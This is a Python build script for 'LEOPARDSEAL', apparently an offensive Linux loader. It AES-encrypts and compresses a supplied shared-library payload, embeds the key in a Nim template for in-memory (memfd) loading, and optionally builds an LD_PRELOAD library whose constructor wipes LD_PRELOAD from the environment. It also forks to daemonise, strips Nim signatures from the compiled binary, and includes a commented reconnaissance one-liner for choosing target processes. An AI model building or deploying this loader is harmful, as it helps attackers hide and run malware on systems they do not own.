import argparse
import base64
import os
import random
import shutil
import string
from binascii import hexlify

from Crypto.Cipher import AES
from Crypto.Util import Counter

import gzip
	
banner = """ LEOPARDSEAL: a linux loader without an ASCII banner
"""

print(banner)



def bytes_to_nimarr(bytestr, varname, genconst=False):
	byteenum = "".join("{0:#04x}, ".format(i) for i in bytestr)

	if genconst:
		return "const "+varname+": array[{}, byte] = [byte {}]".format(len(bytestr), byteenum[:-2])

	return "var "+varname+": array[{}, byte] = [byte {}]".format(len(bytestr), byteenum[:-2])


parser = argparse.ArgumentParser()

parser.add_argument("-o", "--output", type=str,
	help="output", default="lseal")
parser.add_argument("-p", "--processname", type=str,
	help="process to preload to", default="/bin/ls")

parser.add_argument("-f", "--preforks", type=int,
	help="prefork count", default=0)

parser.add_argument("--signal", action="store_true",
	help="send a SIGINT to the child process")

parser.add_argument("--wait", action="store_true",
	help="wait for SIGINT before running (only for shared libraries)")

parser.add_argument("--shared", action="store_true",
	help="generate an .so file")
parser.add_argument("--forever", action="store_true",
	help="run forever")

required = parser.add_argument_group('required arguments')
required.add_argument("-s", "--so", type=str,
	help="path to the .SO library")

args = parser.parse_args()

compile_template = "nim c --hints:off {cmdline_args}--out:{outfile} {filename}"
cmdline_args = ""


with open(args.so, "rb") as f:
	dll_bytes = f.read()

key = os.urandom(16)
iv = os.urandom(16)

print("[+] encrypting")
ctr = Counter.new(128, initial_value=int(hexlify(iv), 16))
cipher = AES.new(key, AES.MODE_CTR, counter=ctr)

encdata = cipher.encrypt(dll_bytes)
print("\t[+] compressing")
with open("data.blob", "wb") as f:
	f.write(gzip.compress(encdata))



with open("sealtemplate.nim", "r") as f:
	template_str = f.read()



crowfile = template_str.replace("#[ KEY_STR ]#", bytes_to_nimarr(key, "aeskey", True))

crowfile = crowfile.replace("#[ IV_STR ]#", bytes_to_nimarr(iv, "aesiv", True))

crowfile = crowfile.replace("%MEMFDNAME%", ''.join(random.choice(string.ascii_lowercase) for _ in range(8)))





preforkheader = """
  var forkpid: clong
"""
preforktemplate = """
  forkpid = syscall(FORK)
  if forkpid != 0:
    echo forkpid
    quit(0)
  sleep(1000)
"""

if args.preforks > 0:
	crowfile = crowfile.replace("#[ FORKS ]#", preforkheader+preforktemplate*args.preforks)


sotemplate = """
proc NimMain() {.cdecl, importc.}
func newexport*() {.exportc, cdecl, dynlib .} =
  {.cast(noSideEffect).}:
    NimMain()
    runmain()

{.emit:\"""


#include <stdlib.h>

static void init(int argc, char **argv, char **envp)
{
    unsetenv("LD_PRELOAD");
    unsetenv("LD_PARAMS");
    newexport();

}
__attribute__((section(".init_array"), used)) static typeof(init) *init_p = init;

\""".}
"""

signaltemplate = """

from system import setControlCHook


proc NimMain() {.cdecl, importc.}
func newexport*() {.exportc, cdecl, dynlib .} =
  {.cast(noSideEffect).}:
    NimMain()
    setControlCHook(runmain)
    while true:
      sleep(1000)

{.emit:\"""


#include <stdlib.h>

static void init(int argc, char **argv, char **envp)
{
    unsetenv("LD_PRELOAD");
    unsetenv("LD_PARAMS");
    newexport();

}
__attribute__((section(".init_array"), used)) static typeof(init) *init_p = init;



\""".}
"""



if args.wait:
	cmdline_args += "--app:lib --nomain --passC:\"-fpie\" "
	crowfile = crowfile.replace("EXEC_METHOD", signaltemplate)
elif args.shared:
	cmdline_args += "--app:lib --nomain --passC:\"-fpie\" "
	crowfile = crowfile.replace("EXEC_METHOD", sotemplate)
else:
	cmdline_args += "--passL:\"-static-libgcc -static\" "
	crowfile = crowfile.replace("EXEC_METHOD", "runmain()")


forevertemplate = """
  while true:
    sleep(2000)

"""

if args.forever:
	crowfile = crowfile.replace("#[ FOREVER ]#", forevertemplate)

sendtemplate = """
  var procobj: Process = startProcess(obf("%PROCNAME%"), env=dataenv)
  sleep(1000)
  sendSignal(cast[int32](procobj.processId()), 2)
"""

nosignaltemplate = """
  var procownd = startProcess(obf("%PROCNAME%"), env=dataenv)
"""

if args.signal:
	crowfile = crowfile.replace("#[ SIGNAL ]#", sendtemplate)
else:
	crowfile = crowfile.replace("#[ SIGNAL ]#", nosignaltemplate)

crowfile = crowfile.replace("%PROCNAME%", args.processname)


with open("sealload.nim", "w") as f:
	f.write(crowfile)

print("[+] compiling", compile_template.format(cmdline_args=cmdline_args, outfile=args.output, filename="sealload.nim"))

os.system(compile_template.format(cmdline_args=cmdline_args, outfile=args.output, filename="sealload.nim"))

with open(args.output, "rb") as f:
	binary_file = f.read()

print("\t[+] replacing nim with xxx")
binary_file = binary_file.replace(b".nim", bytes(''.join(random.choice(string.ascii_lowercase) for _ in range(4)), encoding="utf-8"))

with open(args.output, "wb") as f:
	f.write(binary_file)

print(" should be saved to: ", args.output)

preload_oneliner = """echo 'connections';netstat -tp 2>/dev/null|grep tcp|awk '{print $7}'|cut -d '/' -f 2|uniq -c;echo 'processes';ps aux|grep -v "\\["|awk '{print $11}'|uniq -c|sort -r|head -n 5"""
#print("[+] finding preload candidates:", preload_oneliner)

print("[!] cleaning up...")

os.remove("data.blob")
os.remove("sealload.nim")
